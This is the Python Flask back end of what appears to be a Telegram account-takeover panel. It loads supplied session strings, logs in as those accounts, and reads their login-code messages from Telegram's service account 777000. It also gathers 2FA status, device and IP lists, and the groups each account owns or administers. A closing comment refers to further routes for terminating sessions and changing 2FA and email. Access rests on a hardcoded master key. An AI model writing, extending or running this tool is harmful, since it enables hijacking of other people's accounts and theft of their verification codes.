from flask import Flask, request, jsonify, render_template
from pyrogram import Client as PyroClient
from pyrogram.errors import SessionPasswordNeeded
from telethon import TelegramClient
from telethon.sessions import StringSession
import asyncio
import os

app = Flask(__name__)

MASTER_ACCESS_KEY = "noobster"
DEFAULT_API_ID = 1234567      
DEFAULT_API_HASH = "your_hash" 

accounts = {}

def check_auth(req):
    return req.headers.get("Authorization") == "secure_token_noobster"

@app.route('/api/auth', methods=['POST'])
def auth():
    data = request.json
    if data.get('accessKey') == MASTER_ACCESS_KEY:
        return jsonify({"success": True, "token": "secure_token_noobster"})
    return jsonify({"error": "Invalid Key"}), 401

# 🔥 ASYNC FIX FOR FLASK
def run_async(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    result = loop.run_until_complete(coro)
    loop.close()
    return result

async def connect_pyro(session_str, api_id, api_hash):
    client = PyroClient(":memory:", api_id=api_id, api_hash=api_hash, session_string=session_str, in_memory=True)
    await client.connect()
    me = await client.get_me()
    return client, me

async def connect_tele(session_str, api_id, api_hash):
    client = TelegramClient(StringSession(session_str), api_id, api_hash)
    await client.connect()
    if not await client.is_user_authorized():
        await client.disconnect()
        return None, None
    me = await client.get_me()
    return client, me

@app.route('/api/add-account', methods=['POST'])
def add_account():
    if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
    data = request.json
    session_str = data.get('session', '').strip()
    api_id = int(data.get('apiId') or DEFAULT_API_ID)
    api_hash = data.get('apiHash') or DEFAULT_API_HASH

    if not session_str: return jsonify({"error": "Session required"}), 400

    try:
        if session_str.startswith("BQ") or session_str.startswith("1B"):
            client, me = run_async(connect_pyro(session_str, api_id, api_hash))
            accounts[str(me.id)] = {"type": "pyrogram", "client": client, "me": me}
        else:
            client, me = run_async(connect_tele(session_str, api_id, api_hash))
            if not client: return jsonify({"error": "Invalid Session or Expired"}), 401
            accounts[str(me.id)] = {"type": "telethon", "client": client, "me": me}

        return jsonify({"success": True, "id": str(me.id)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/accounts', methods=['GET'])
def get_accounts():
    if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
    acc_list = []
    for acc_id, data in accounts.items():
        me = data['me']
        acc_list.append({
            "id": acc_id, "name": getattr(me, 'first_name', 'Unknown'), "phone": getattr(me, 'phone_number', 'Hidden'),
            "photo": f"https://ui-avatars.com/api/?name={getattr(me, 'first_name', 'U')}&background=2b5278&color=fff"
        })
    return jsonify(acc_list)

@app.route('/api/chats/<acc_id>', methods=['GET'])
def get_chats(acc_id):
    if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
    if acc_id not in accounts: return jsonify({"error": "Account not found"}), 404

    return jsonify([{
        "id": "777000", "name": "Telegram (Notification Bot)",
        "lastMsg": "Verification codes and service updates"
    }])

@app.route('/api/messages/<acc_id>/<chat_id>', methods=['GET'])
def get_messages(acc_id, chat_id):
    if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
    if acc_id not in accounts: return jsonify({"error": "Account not found"}), 404

    data = accounts[acc_id]
    client = data['client']
    msgs = []

    try:
        if data['type'] == 'pyrogram':
            async def fetch(): return [m async for m in client.get_messages(777000, limit=20)]
            messages = run_async(fetch())
            for m in reversed(messages):
                msgs.append({"text": m.text or "[Media]", "isMine": m.outgoing})
        else:
            async def fetch():
                entity = await client.get_entity(777000)
                return await client.get_messages(entity, limit=20)
            messages = run_async(fetch())
            for m in reversed(messages):
                msgs.append({"text": m.message or "[Media]", "isMine": m.out})
        return jsonify(msgs)
    except Exception as e:
        return jsonify({"error": f"Msg Error: {str(e)}"}), 500

@app.route('/api/profile/<acc_id>', methods=['GET'])
def get_profile(acc_id):
    if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
    if acc_id not in accounts: return jsonify({"error": "Account not found"}), 404

    data = accounts[acc_id]
    me = data['me']
    client = data['client']

    try:
        has_2fa = False
        devices = []
        admin_chats = []

        if data['type'] == 'pyrogram':
            async def fetch_pyro():
                # Pyrogram me 2FA check (approx) aur Devices
                try:
                    pwd = await client.get_password_hint()
                    fa = pwd is not None
                except: fa = False
                
                return fa, [], []

            has_2fa, devices, admin_chats = run_async(fetch_pyro())
        else:
            from telethon.tl.functions.account import GetAuthorizationsRequest, GetPasswordRequest
            from telethon.tl.types import Channel, Chat
            
            async def fetch_tele():
                pwd_info = await client(GetPasswordRequest())
                auths = await client(GetAuthorizationsRequest())
                devs = [{"device": a.device_model, "ip": a.ip, "current": a.current} for a in auths.authorizations]
                
                admins = []
                async for dialog in client.iter_dialogs(limit=50):
                    if isinstance(dialog.entity, (Channel, Chat)):
                        try:
                            perms = await client.get_permissions(dialog.entity, "me")
                            if perms.is_admin or perms.is_creator:
                                admins.append({"name": dialog.name, "type": "Owner" if perms.is_creator else "Admin"})
                        except: pass
                return pwd_info.has_password, devs, admins

            has_2fa, devices, admin_chats = run_async(fetch_tele())

        return jsonify({
            "name": getattr(me, 'first_name', 'Unknown'), "id": str(me.id),
            "username": getattr(me, 'username', 'None'),
            "phone": getattr(me, 'phone_number', 'Hidden'),
            "has_2fa": has_2fa, "devices": devices, "admin_chats": admin_chats
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ... (Baaki routes same rahenge: terminate, 2fa, email) ...
